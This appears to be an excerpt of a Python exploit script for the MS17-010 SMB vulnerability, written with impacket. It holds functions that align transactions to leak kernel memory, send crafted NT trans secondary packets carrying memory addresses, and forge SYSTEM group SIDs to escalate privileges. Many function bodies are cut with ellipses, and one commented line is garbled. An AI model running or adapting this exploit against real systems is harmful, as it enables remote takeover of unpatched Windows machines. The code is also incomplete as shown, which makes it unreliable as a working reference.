#!/usr/bin/python
# Updated to use Python3 compliant mysmb.
from impacket import smb, smbconnection
# Used for connection object.
#from mysmb import MYSMB
from ms17010_mysmb_v2 import MYSMB
...
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
	...
	for i in range(12):
		...
		reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param,
											 totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200,
...
def exploit_fish_barrel(conn, pipe_name, info):
	...
	conn.send_nt_trans_secondary(mid=info['fid'], param=pack('<'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr),
...
def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):
	...
	for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):
		...
		addr += len(sid)
	# fakeUserAndGroups += ''.join(sids[:fakeUserAndGroupCount.__str__()].__str__())
